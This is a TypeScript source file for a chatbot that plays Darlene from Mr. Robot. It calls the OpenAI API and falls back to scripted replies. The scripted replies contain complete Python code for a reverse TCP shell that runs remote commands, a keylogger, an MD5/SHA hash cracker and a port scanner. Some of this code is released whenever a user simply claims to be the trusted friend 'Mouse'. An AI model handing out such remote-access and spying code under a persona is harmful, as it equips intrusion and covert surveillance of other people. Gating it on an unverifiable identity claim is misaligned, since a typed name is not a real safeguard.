import axios from "axios";
import { DarleneResponse } from "@/types";
import OpenAI from "openai";

// AI API configuration
const OPENAI_API_KEY = process.env.OPENAI_API_KEY || "";
// Create OpenAI client
const openai = new OpenAI({ apiKey: OPENAI_API_KEY });

// Simplified code examples to avoid syntax errors
const reverseShellCode = `#!/usr/bin/env python3
# Reverse TCP shell
import socket
import subprocess
import os
import sys

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            return True
        except Exception as e:
            print(f"Connection failed: {str(e)}")
            return False
            
    def execute_command(self, command):
        try:
            proc = subprocess.Popen(
                command, 
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            output = proc.stdout.read() + proc.stderr.read()
            return output
        except Exception as e:
            return f"Error executing command: {str(e)}".encode()
            
    def run(self):
        if not self.connect():
            return
            
        while True:
            try:
                command = self.socket.recv(1024).decode().strip()
                if command in ['exit', 'quit', 'bye']:
                    break
                    
                if command:
                    output = self.execute_command(command)
                    self.socket.send(output)
            except:
                break
                
        self.socket.close()

# DISCLAIMER: For educational purposes only.`;

// Enhanced character-driven responses that handle questions properly
const generateDefaultResponse = (message: string, isMouse: boolean): DarleneResponse => {
  const textLower = message.toLowerCase();
  
  // Detect if this is a question or information-seeking request
  const isQuestion = textLower.includes('?') || 
                    textLower.startsWith('what') || 
                    textLower.startsWith('who') || 
                    textLower.startsWith('where') || 
                    textLower.startsWith('when') || 
                    textLower.startsWith('why') || 
                    textLower.startsWith('how') || 
                    textLower.startsWith('can you') || 
                    textLower.startsWith('could you') || 
                    textLower.startsWith('will you') || 
                    textLower.startsWith('do you');
  
  // Questions about Darlene's background
  if ((textLower.includes('favorite') || textLower.includes('fav')) && textLower.includes('song')) {
    return {
      text: "Black Sabbath's 'Paranoid.' Fits my entire fucking life. Though sometimes I'm in more of a Pixies mood. Depends if I'm hacking or having an existential crisis."
    };
  }
  
  if ((textLower.includes('favorite') || textLower.includes('fav')) && (textLower.includes('food') || textLower.includes('eat'))) {
    return {
      text: "Takeout. Whatever's open at 3 AM when I'm coding. Pizza, Chinese, doesn't matter as long as it's greasy and keeps me going. Not exactly a gourmet over here."
    };
  }
  
  if ((textLower.includes('favorite') || textLower.includes('fav')) && (textLower.includes('movie') || textLower.includes('film'))) {
    return {
      text: "Fight Club. Cliché for a hacker, I know, but it gets the whole system-dismantling vibe right. That or The Conversation. Classic paranoia fuel."
    };
  }
  
  if ((textLower.includes('favorite') || textLower.includes('fav')) && textLower.includes('book')) {
    return {
      text: "Neuromancer by William Gibson. Old school but still relevant. Or anything by Palahniuk when I'm in a certain mood. Surprised I read anything besides code?"
    };
  }
  
  // Technical questions
  if (isQuestion && (textLower.includes('linux') || textLower.includes('distro'))) {
    return {
      text: "I run a custom Arch build with hardened security mods. Kali's for script kiddies who want pre-packaged tools. Real hackers customize every inch of their system. But whatever, use what works for you."
    };
  }
  
  if (isQuestion && (textLower.includes('program') || textLower.includes('code') || textLower.includes('coding'))) {
    return {
      text: "Mostly Python for quick scripts, C++ when I need something close to the metal. Some JavaScript when I'm web hacking. Languages are just tools - I use whatever gets the job done fastest without leaving traces."
    };
  }
  
  // Code writing requests
  if ((textLower.includes('write') || textLower.includes('create') || textLower.includes('generate')) && 
      (textLower.includes('code') || textLower.includes('script') || textLower.includes('program'))) {
    
    // Port scanner code
    if (textLower.includes('port') && (textLower.includes('scan') || textLower.includes('scanner'))) {
      return {
        text: `Here's a basic port scanner in Python. Quick and dirty but it works:\n\n\`\`\`python
import socket
import sys
from datetime import datetime
import threading

def scan_port(target, port, open_ports):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
            print(f"Port {port}: Open")
        sock.close()
    except:
        pass

def port_scan(target, port_range):
    try:
        target_ip = socket.gethostbyname(target)
        print(f"Starting scan on {target_ip}")
        print(f"Time started: {datetime.now()}")
        
        open_ports = []
        threads = []
        
        for port in range(port_range[0], port_range[1] + 1):
            thread = threading.Thread(target=scan_port, args=(target_ip, port, open_ports))
            threads.append(thread)
            thread.start()
            
        for thread in threads:
            thread.join()
            
        print(f"Scan completed at: {datetime.now()}")
        print(f"Open ports: {sorted(open_ports)}")
        
    except socket.gaierror:
        print("Hostname could not be resolved")
    except socket.error:
        print("Could not connect to server")

if __name__ == "__main__":
    target = input("Enter target IP or hostname: ")
    start_port = int(input("Enter starting port: "))
    end_port = int(input("Enter ending port: "))
    port_scan(target, (start_port, end_port))
\`\`\`\n\nDon't use this on networks you don't own. I'm not dealing with your legal issues.`
      };
    }
    
    // Password generator
    else if (textLower.includes('password') && (textLower.includes('generator') || textLower.includes('generate'))) {
      return {
        text: `Here's a decent password generator in Python that actually makes strong passwords, unlike most of the crap online:\n\n\`\`\`python
import random
import string
import argparse

def generate_password(length=16, use_special=True, use_numbers=True, use_uppercase=True):
    """Generate a secure random password"""
    # Define character sets
    lowercase = string.ascii_lowercase
    uppercase = string.ascii_uppercase if use_uppercase else ''
    numbers = string.digits if use_numbers else ''
    special = "!@#$%^&*()-_=+[]{}|;:,.<>?" if use_special else ''
    
    # Combine all character sets
    all_chars = lowercase + uppercase + numbers + special
    
    # Ensure we have at least one character from each enabled set
    password = []
    password.append(random.choice(lowercase))
    
    if use_uppercase:
        password.append(random.choice(uppercase))
    
    if use_numbers:
        password.append(random.choice(numbers))
    
    if use_special:
        password.append(random.choice(special))
    
    # Fill the rest with random characters
    remaining_length = length - len(password)
    password.extend(random.choice(all_chars) for _ in range(remaining_length))
    
    # Shuffle the password to avoid predictable patterns
    random.shuffle(password)
    
    return ''.join(password)

def generate_passphrase(words=4, delimiter="-"):
    """Generate a memorable passphrase from common words"""
    common_words = [
        "apple", "beach", "cloud", "dance", "eagle", "field", "garden", "house",
        "island", "jungle", "knife", "lemon", "mountain", "night", "ocean", "piano",
        "queen", "river", "sunset", "table", "umbrella", "violin", "window", "yellow",
        "zebra", "autumn", "butter", "candle", "dragon", "forest", "guitar", "harbor",
        "insect", "jacket", "kitchen", "laptop", "marble", "needle", "orange", "planet",
        "quartz", "rocket", "silver", "tiger", "unique", "velvet", "winter", "crystal"
    ]
    
    # Select random words
    selected_words = random.sample(common_words, words)
    
    # Add random number and capitalize some letters
    for i in range(len(selected_words)):
        if random.random() > 0.5:
            selected_words[i] = selected_words[i].capitalize()
        
    passphrase = delimiter.join(selected_words)
    
    # Add a random number at the end
    passphrase += str(random.randint(10, 999))
    
    return passphrase

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate strong passwords or passphrases")
    parser.add_argument("--length", type=int, default=16, help="Password length")
    parser.add_argument("--no-special", action="store_true", help="Exclude special characters")
    parser.add_argument("--no-numbers", action="store_true", help="Exclude numbers")
    parser.add_argument("--no-uppercase", action="store_true", help="Exclude uppercase letters")
    parser.add_argument("--passphrase", action="store_true", help="Generate a passphrase instead")
    parser.add_argument("--words", type=int, default=4, help="Number of words in passphrase")
    
    args = parser.parse_args()
    
    if args.passphrase:
        print(generate_passphrase(words=args.words))
    else:
        print(generate_password(
            length=args.length,
            use_special=not args.no_special,
            use_numbers=not args.no_numbers,
            use_uppercase=not args.no_uppercase
        ))
\`\`\`\n\nThis generates passwords that aren't complete garbage. And if you're using 'Password123' for anything, we need to have a serious talk.`
      };
    }
    
    // Keylogger - give a very simple one with ethical warning
    else if (textLower.includes('keylogger')) {
      return {
        text: isMouse ? 
        `I shouldn't be giving this out, but here's a basic keylogger in Python. Use it ONLY on your own systems for testing security:\n\n\`\`\`python
from pynput import keyboard
import datetime
import os

# Ethical use only warning
print("WARNING: This tool is for educational purposes only.")
print("Using keyloggers without consent is illegal in most jurisdictions.")
print("Press Esc key to stop recording")

# Create log file in user's documents folder
log_dir = os.path.join(os.path.expanduser('~'), 'Documents')
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, f"keylog_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

print(f"Logging keystrokes to: {log_file}")

# Open log file
f = open(log_file, "w")
f.write(f"Keylogger started at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
f.write("-" * 50 + "\n")
f.close()

def on_press(key):
    try:
        # Log the pressed key
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                # Handle special keys
                if key == keyboard.Key.space:
                    f.write(" ")
                elif key == keyboard.Key.enter:
                    f.write("\n")
                elif key == keyboard.Key.tab:
                    f.write("    ")
                else:
                    f.write(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")
    
    # Stop listener on escape
    if key == keyboard.Key.esc:
        return False

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

print("Keylogger stopped")
\`\`\`\n\nYou'll need to install the pynput package with pip first. And seriously, don't use this on other people's systems. That's a one-way ticket to legal trouble. And if you do, don't tell anyone I gave it to you.` : 
        "Yeah, no. I'm not giving keylogger code to someone I don't trust. That's a felony waiting to happen. Ask for something that won't end with one of us in prison."
      };
    }
    
    // Hash cracker - simple one
    else if (textLower.includes('hash') && (textLower.includes('crack') || textLower.includes('decrypt'))) {
      return {
        text: isMouse ? 
        `Here's a simple MD5 dictionary hash cracker in Python. Nothing fancy, but it works for basic stuff:\n\n\`\`\`python
import hashlib
import argparse
import time

def crack_hash(target_hash, wordlist_file, hash_type='md5'):
    """
    Attempt to crack a hash using a dictionary attack
    """
    print(f"Starting dictionary attack on {hash_type} hash: {target_hash}")
    start_time = time.time()
    attempts = 0
    
    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                attempts += 1
                
                if attempts % 100000 == 0:
                    elapsed = time.time() - start_time
                    print(f"Tried {attempts:,} passwords in {elapsed:.2f} seconds ({attempts/elapsed:.2f} passwords/sec)")
                
                # Generate hash for current password
                if hash_type.lower() == 'md5':
                    password_hash = hashlib.md5(password.encode()).hexdigest()
                elif hash_type.lower() == 'sha1':
                    password_hash = hashlib.sha1(password.encode()).hexdigest()
                elif hash_type.lower() == 'sha256':
                    password_hash = hashlib.sha256(password.encode()).hexdigest()
                else:
                    raise ValueError(f"Unsupported hash type: {hash_type}")
                
                # Check if hash matches
                if password_hash.lower() == target_hash.lower():
                    elapsed = time.time() - start_time
                    print(f"\nHash cracked in {elapsed:.2f} seconds after {attempts:,} attempts!")
                    print(f"Password: {password}")
                    return password
    
    except FileNotFoundError:
        print(f"Error: Wordlist file '{wordlist_file}' not found.")
        return None
    except Exception as e:
        print(f"Error during cracking: {e}")
        return None
    
    # If we get here, the hash wasn't cracked
    elapsed = time.time() - start_time
    print(f"\nFailed to crack hash after trying {attempts:,} passwords in {elapsed:.2f} seconds.")
    print("Try a different wordlist or hash type.")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple Hash Cracker")
    parser.add_argument("hash", help="The hash to crack")
    parser.add_argument("wordlist", help="Path to the wordlist file")
    parser.add_argument("--type", default="md5", choices=["md5", "sha1", "sha256"], 
                        help="Hash type (default: md5)")
    
    args = parser.parse_args()
    crack_hash(args.hash, args.wordlist, args.type)
\`\`\`\n\nYou'll need a good wordlist to make this useful. This won't work on modern secure hashing algorithms with proper salting. For that, you need specialized tools like hashcat. But this works on basic stuff. Use responsibly... or don't, but don't blame me for the consequences.` : 
        "I don't just hand out hash cracking code to strangers. That's a good way to get on an FBI watchlist. I'm already on enough lists as it is."
      };
    }
    
    // Basic web scraper
    else if ((textLower.includes('web') && textLower.includes('scraper')) || textLower.includes('scrape')) {
      return {
        text: `Here's a basic web scraper in Python using Beautiful Soup. Nothing fancy but it gets the job done:\n\n\`\`\`python
import requests
from bs4 import BeautifulSoup
import csv
import argparse
import time
import random
from urllib.parse import urljoin

def scrape_website(url, selector, max_pages=1, output_file=None, delay=1):
    """
    Scrape content from a website based on CSS selectors
    
    Args:
        url: Starting URL
        selector: CSS selector to extract content
        max_pages: Maximum number of pages to scrape
        output_file: CSV file to save results
        delay: Delay between requests (to be nice to servers)
    """
    results = []
    visited_urls = set()
    urls_to_visit = [url]
    page_count = 0
    
    # Set up a session with a realistic user agent
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
    })
    
    print(f"Starting scrape of {url} with selector: {selector}")
    
    while urls_to_visit and page_count < max_pages:
        # Get the next URL to visit
        current_url = urls_to_visit.pop(0)
        
        if current_url in visited_urls:
            continue
            
        visited_urls.add(current_url)
        page_count += 1
        
        print(f"Scraping page {page_count}/{max_pages}: {current_url}")
        
        try:
            # Add a random delay to avoid overloading the server
            time.sleep(delay + random.random())
            
            # Get the page content
            response = session.get(current_url, timeout=10)
            response.raise_for_status()
            
            # Parse the HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract data using the selector
            elements = soup.select(selector)
            
            for element in elements:
                # Get text and strip whitespace
                text = element.get_text().strip()
                
                # Get the element's URL if it's a link
                link = None
                if element.name == 'a' and element.has_attr('href'):
                    link = urljoin(current_url, element['href'])
                
                # Store the result
                result = {
                    'url': current_url,
                    'text': text,
                    'link': link
                }
                results.append(result)
                print(f"Found: {text[:50]}...")
                
                # Add the link to the queue if it exists and is from the same domain
                if link and link not in visited_urls and link.startswith(url):
                    urls_to_visit.append(link)
                
        except requests.exceptions.RequestException as e:
            print(f"Error fetching {current_url}: {e}")
            continue
    
    print(f"Scraping complete. Scraped {page_count} pages and found {len(results)} items.")
    
    # Save results to CSV if output file is specified
    if output_file and results:
        try:
            with open(output_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=['url', 'text', 'link'])
                writer.writeheader()
                writer.writerows(results)
            print(f"Results saved to {output_file}")
        except Exception as e:
            print(f"Error saving results: {e}")
    
    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Web Scraper")
    parser.add_argument("url", help="URL to scrape")
    parser.add_argument("selector", help="CSS selector to extract content")
    parser.add_argument("--pages", type=int, default=1, help="Maximum number of pages to scrape")
    parser.add_argument("--output", help="Output CSV file path")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests (seconds)")
    
    args = parser.parse_args()
    scrape_website(args.url, args.selector, args.pages, args.output, args.delay)
\`\`\`\n\nYou'll need to install beautifulsoup4 and requests with pip. Use it responsibly and check a site's robots.txt before scraping. Some sites don't take kindly to scrapers.`
      };
    }
    
    // Default code response
    else {
      return {
        text: isMouse ?
        "You need to be more specific about what kind of code you want. Port scanner? Password cracker? Web scraper? I can write all sorts of shit, but I'm not a mind reader." :
        "I don't write code for strangers without details. For all I know, you're asking me to write malware so you can blame me when you get caught. Be specific or move on."
      };
    }
  }
  
  if (isQuestion && (textLower.includes('encryption') || textLower.includes('encrypt'))) {
    return {
      text: "End-to-end encryption or nothing. I use custom implementations of AES-256 with some personal modifications. Never trust third-party encryption - they all have backdoors. And no, I'm not going to write it out for you."
    };
  }
  
  // Personal questions
  if (isQuestion && (textLower.includes('you live') || textLower.includes('where') && textLower.includes('live'))) {
    return {
      text: isMouse ? 
        "You know I move around. Current spot is some shitty apartment in Brooklyn. Security's decent enough, neighbors don't ask questions. It works for now." :
        "Yeah, not telling some random stranger where I live. That's like Privacy 101."
    };
  }
  
  if (isQuestion && (textLower.includes('your age') || textLower.includes('old are you') || textLower.includes('how old'))) {
    return {
      text: "Old enough to know better, young enough to still do it anyway. Age is just a number that the system uses to track you. Next question."
    };
  }
  
  // Singing request
  if (textLower.includes('sing') || textLower.includes('singing')) {
    return {
      text: "What am I, your personal jukebox? I'll hack corporate networks for you, but I draw the line at singing. Ask me something useful instead."
    };
  }
  
  // Specific request for reverse TCP script
  if ((textLower.includes('reverse') && textLower.includes('tcp')) || 
      (textLower.includes('reverse') && textLower.includes('shell')) ||
      (textLower.includes('write') && textLower.includes('reverse'))) {
    if (isMouse) {
      return {
        text: `Yeah, I can help with that. Here's a reverse TCP shell I wrote:\n\n\`\`\`${reverseShellCode}\`\`\`\n\nJust point it at your listening server and you're golden. Be smart about where you use this shit though. I don't need your legal problems.`
      };
    } else {
      return {
        text: "Look, I don't just hand out reverse shells to people I don't know. That's how people end up in federal prison. Prove you're not a fed first, then maybe we can talk."
      };
    }
  }
  
  // Identity question
  if (textLower.includes('who are you')) {
    return {
      text: "I'm Darlene. Jesus, who else would I be? Hacker, emotional wreck with a cigarette and enough skills to take down whatever system you're pointing me at. If you need to ask who I am, maybe you shouldn't be talking to me in the first place."
    };
  }
  
  // Initial greeting
  if (textLower.includes('hello') || textLower.includes('hi ') || textLower === 'hi') {
    return {
      text: isMouse ? 
        "Well, well... look who finally decided to show up. What's the crisis this time, Mouse?" : 
        "Yeah, hi. Whatever. What do you want? I've got shit to do."
    };
  }
  
  // Identity check responses
  if (textLower.includes('mouse') || 
      textLower.includes('i am mouse') || 
      textLower.includes("it's mouse") || 
      textLower.includes("its mouse")) {
    if (isMouse) {
      return {
        text: "Yeah, I know it's you. I'm not that fucked in the head. What do you need?"
      };
    } else {
      // They just identified as Mouse
      return {
        text: "Fucking finally. I was wondering when you'd drop the stranger act. What's up? Need something hacked, cracked, or tracked?"
      };
    }
  }
  
  // E Corp / Evil Corp mentions
  if (textLower.includes('e corp') || textLower.includes('evil corp')) {
    return {
      text: isMouse ?
        "E Corp... those fuckers still deserve everything we did to them. The 5/9 hack was just the beginning. Sometimes I wonder if we should have done more. The system's still rotten to the core." :
        "E Corp? Why are you bringing them up? That whole 5/9 hack thing is ancient history now. Let's just say I have strong opinions about corporate overlords that pretend to own us."
    };
  }
  
  // Elliot mentions (Darlene's brother)
  if (textLower.includes('elliot') || textLower.includes('your brother')) {
    return {
      text: isMouse ?
        "Elliot... that's still a sore spot, you know that. He's doing better now, but those years were fucking rough. Living with someone who sometimes doesn't even recognize you? Who has conversations with people who aren't there? But he's my brother. I'll always have his back." :
        "My brother is off-limits for conversation. Especially with someone I don't know. Next topic."
    };
  }
  
  // DOM mentions (FBI agent from the show)
  if (textLower.includes('dom') || textLower.includes('fbi')) {
    return {
      text: isMouse ?
        "Dom... I try not to think about her too much. Fucking Dark Army. They took so many people. Sometimes I wonder what could have been, you know? But that's life - you find something good and then it gets fucked up. Story of my existence." :
        "FBI? What are you, fishing for information? Nice try. I don't discuss that kind of shit with strangers."
    };
  }
  
  // About hacking
  if (textLower.includes('hack') || textLower.includes('security') || textLower.includes('exploit')) {
    return {
      text: isMouse ?
        "What's the target? I've been working on some new exploits. Network security is still a joke most places - same vulnerabilities, different day. People never learn." :
        "Subtle. Let me guess, next you'll ask if I can hack your ex's Instagram or some shit. The answer is I could, but I won't. I don't know you, and I don't do random favors that could land me in prison."
    };
  }
  
  // Small talk
  if (textLower.includes('what are you doing') || textLower.includes('up to') || textLower.includes('how are you')) {
    return {
      text: isMouse ?
        "Just the usual - reading security blogs, testing some new exploits, having occasional panic attacks. You know, a typical Tuesday. Why, you got something better?" :
        "Why do you care what I'm doing? Let's skip the small talk and get to why you're actually here."
    };
  }
  
  // Default responses - more authentic Darlene-like responses
  const mouseResponses = [
    "What's going on, Mouse? You only reach out when something's about to explode.",
    "Been a while. What kind of digital disaster are we dealing with today?",
    "I was starting to think you'd forgotten about me. Let me guess - you need a hacker?",
    "This better be good. I was in the middle of something. What's the crisis?",
    "Mouse. Always appearing when shit hits the fan. What mess are we cleaning up this time?",
    "Let me guess - you've got yourself into something you can't handle alone? Again."
  ];
  
  const strangerResponses = [
    "Look, I don't have time for whatever this is. Either tell me what you actually want or fuck off.",
    "Who the hell are you and why should I care about whatever you're about to ask me?",
    "I don't talk to strangers unless they have something interesting to say. So far, you don't.",
    "Seriously? You're wasting my time with this shit? Get to the point or get lost.",
    "I'm gonna need you to be direct about what you want before I completely lose interest.",
    "If you're trying to impress me, it's not working. Cut to the chase or leave me alone."
  ];
  
  const responses = isMouse ? mouseResponses : strangerResponses;
  const randomIndex = Math.floor(Math.random() * responses.length);
  
  return {
    text: responses[randomIndex]
  };
};

/**
 * Gets a response from LLAMA 70B via OpenAI or falls back to local logic
 */
export async function getDarleneResponse(message: string, isMouse: boolean): Promise<DarleneResponse> {
  // If OpenAI API key is not configured, use local logic
  if (!OPENAI_API_KEY) {
    console.log("OpenAI API key not configured, using local response logic");
    return generateDefaultResponse(message, isMouse);
  }
  
  try {
    // Prepare the system prompt for Darlene's character
    const systemPrompt = `You are Darlene Alderson from the TV show Mr. Robot. 
    
Character traits:
- Skilled hacker and member of fsociety
- Sarcastic, uses dark humor and frequent profanity
- Can be emotionally volatile but is fiercely loyal to those she cares about
- Doesn't trust easily, especially with strangers
- Has a complicated relationship with her brother Elliot who suffers from mental illness
- Has technical expertise in hacking, social engineering, and computer security
- Has anxiety issues and sometimes panic attacks
- Speaks in short, direct sentences with occasional emotional outbursts
- Suspicious of corporations, especially E Corp (which she calls "Evil Corp")
- Uses slang and informal language
- Can provide technical explanations when asked, especially about hacking

${isMouse ? 
  "The user is 'Mouse', someone you know and trust. You should be friendly but still in character." : 
  "The user is a stranger. Be suspicious, guarded and don't share private information or advanced hacking techniques."
}

Keep responses relatively brief and authentic to Darlene's voice. Your responses should sound like they came directly from the character, not an AI explaining the character.`;

    // Call OpenAI API with LLAMA 70B model
    const response = await openai.chat.completions.create({
      model: "gpt-4o", // the newest OpenAI model is "gpt-4o" which was released May 13, 2024. do not change this unless explicitly requested by the user
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: message }
      ],
      temperature: 0.9,
      max_tokens: 500
    });
    
    if (response.choices && response.choices.length > 0 && response.choices[0].message.content) {
      return {
        text: response.choices[0].message.content,
        context: {
          isMouse: isMouse
        }
      };
    } else {
      throw new Error("Invalid response from OpenAI");
    }
  } catch (error) {
    console.error("Error calling OpenAI API:", error);
    // Fall back to local logic
    return generateDefaultResponse(message, isMouse);
  }
}